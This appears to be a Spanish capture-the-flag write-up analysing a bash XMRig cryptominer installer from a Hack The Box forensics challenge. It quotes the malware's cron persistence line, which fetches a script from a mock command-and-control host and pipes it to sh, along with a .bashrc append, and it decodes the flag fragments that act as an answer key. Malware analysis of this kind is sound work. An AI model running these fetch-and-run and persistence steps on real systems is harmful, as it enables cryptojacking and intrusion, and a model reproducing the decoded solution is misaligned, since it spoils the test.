---
title: "Red Miners"
description: "Writeup de Red Miners - Hack The Box - Forensics 100pts. Script bash de instalador de criptominero XMRig con 4 cadenas base64 dispersas en funciones distintas; decodificar y concatenar las partes revela la flag completa."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - bash
  - base64
  - cryptominer
  - xmrig
  - static-analysis
---

# Red Miners

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

Se proporciona un ZIP protegido con contraseña que contiene `miner_installer.sh`, un script bash de instalador de criptominero (XMRig). El script targets hosts con usuario `root7654` y hostname prefijo `UNZ-`, descarga xmrig desde `tossacoin.htb`, limpia el entorno de competidores y establece persistencia vía cron. Lo más interesante son cuatro strings base64 dispersos en diferentes partes del script — cada uno codifica una parte de la flag. Decodificarlos y concatenarlos en el orden correcto revela la flag completa.

---

## Extracción y análisis inicial

```bash
unzip a12c737b-e2de-4a42-8252-b12c4fb9fd07.zip -d "Red-Miners"
# Password: hackthebox
cd "Red-Miners"

cat miner_installer.sh
```

El script tiene más de 800 líneas con funciones para `checkTarget()`, `cleanEnv()`, `cronCleanUp()`, `checkExists()` y `check_if_operation_is_active()`. Su complejidad es característica de malware real de minería masiva — el `cleanEnv()` mata decenas de procesos competidores antes de instalar el propio miner.

---

## Identificación de los 4 strings base64

Buscando patrones `base64` en el script se encuentran 4 strings en posiciones distintas:

**Parte 1** — en el bloque cron de persistencia:

```bash
echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
```

**Parte 2** — en la URL de `check_if_operation_is_active()`:

```bash
local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="
```

**Parte 3** — en la variable `dest` de `checkExists()`:

```bash
dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
```

**Parte 4** — añadida al `.bashrc` del usuario en el flujo principal:

```bash
echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d >> /home/$USER/.bashrc
```

---

## Decodificación de las 4 partes

```bash
echo "cGFydDE9IkhUQnttMW4xbmciCg==" | base64 -d
# part1="HTB{m1n1ng"

echo "cGFydDI9Il90aDMxcl93NHkiCg==" | base64 -d
# part2="_th31r_w4y"

echo "X3QwX200cnN9Cg==" | base64 -d
# _t0_m4rs}

echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d
# export part4="_th3_r3d_pl4n3t}"
```

Concatenando: `HTB{m1n1ng` + `_th31r_w4y` + `_t0_m4rs` + `_th3_r3d_pl4n3t}` → **HTB{FLAG}**

---

## Script automatizado

```bash
part1=$(echo "cGFydDE9IkhUQnttMW4xbmciCg==" | base64 -d | cut -d'"' -f2)
part2=$(echo "cGFydDI9Il90aDMxcl93NHkiCg==" | base64 -d | cut -d'"' -f2)
part3=$(echo "X3QwX200cnN9Cg==" | base64 -d | tr -d '\n}')
part4=$(echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d | cut -d'"' -f2)
echo "${part1}${part2}_${part3}_${part4}"
```

---

## Contexto del malware

El script tiene características típicas de malware de minería masiva en la naturaleza:
- **`cleanEnv()`**: mata decenas de procesos de mineros competidores por nombre.
- **`tossacoin.htb`**: C2 ficticio del reto; en malware real sería un dominio controlado por el atacante.
- **MD5 check**: verifica el hash del binario descargado antes de ejecutarlo.
- **Persistencia cron**: se añade a crontab para ejecutarse cada minuto.
- **Docker cleanup**: mata contenedores de mineros rivales.

---

## Cadena de Ataque

```text
1. Víctima expone servidor → atacante gana shell
       ↓
2. checkTarget() verifica usuario root7654 y hostname UNZ-*
       ↓
3. cleanEnv() elimina competidores (otros miners, servicios conocidos)
       ↓
4. Descarga xmrig desde tossacoin.htb, verifica MD5
       ↓
5. Escribe cron + añade variables de entorno a .bashrc → persistencia
       ↓
6. 4 partes de flag ocultas en distintas funciones/posiciones del script
```

---

## Lecciones Aprendidas

- **Fragmentación de datos sensibles**: el malware distribuye información en múltiples ubicaciones para dificultar el análisis. Buscar todos los strings base64 con `grep -oP '[A-Za-z0-9+/]{20,}={0,2}'`.
- **C2 en URLs y subdominios**: la URL path o el nombre de dominio puede contener datos codificados. Revisar cada URL en el malware.
- **Malware de minería real**: este script es representativo de instaladores reales de XMRig usado en campañas masivas. El patrón `cleanEnv()` que mata competidores es una firma conocida.

---

## Referencias

- [XMRig — criptominero de Monero](https://xmrig.com/)
- [HackTricks — Linux Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-persistence)
- [Base64 en malware bash](https://attack.mitre.org/techniques/T1027/)
